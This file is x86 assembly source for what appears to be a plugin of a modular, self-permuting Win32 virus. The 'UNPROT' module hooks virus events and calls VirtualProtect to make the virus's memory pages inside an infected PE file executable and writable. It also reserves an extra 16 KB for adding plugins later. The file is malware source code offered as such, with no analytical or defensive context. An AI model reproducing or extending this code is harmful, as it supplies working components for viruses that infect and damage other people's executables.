   ; UNPROT
   ; ~~~~~~
   ; - unprotects viral memory pages in the current PE file

   include                 INCLUDE\consts.inc
   include                 system.inc
   include                 k32man.inc

   include                 plugin.inc
                           PLUGIN_START    UNPROT, W32R3, PERMUTABLE

   handleevent:            hookevent EV_UNPROT_ME, unprot_me
                           hookevent EV_UNPROT_RANGE, unprot_range
                           stc
                           retn

   unprot_me:              pusha

                           IS_RING0
                           jz      __exit

                           event   EV_SYSTEM_GET_VIR_SIZE

                           call    unprot_range

                           ; extra 16k in the case
                           ; when we will add new plugins.
                           ; but really, we shouldn't do it in the PE file
                           add     esi, ecx
                           mov     ecx, 16384
                           call    unprot_range

   __exit:                 popa
                           clc
                           retn

   ; input: ESI/ECX

   unprot_range:           pusha
                           push    esp
                           push    PAGE_EXECUTE_READWRITE  ; ro -> rw
                           push    ecx
                           push    esi
                           callX   VirtualProtect
                           popa
                           clc
                           retn

                           PLUGIN_END
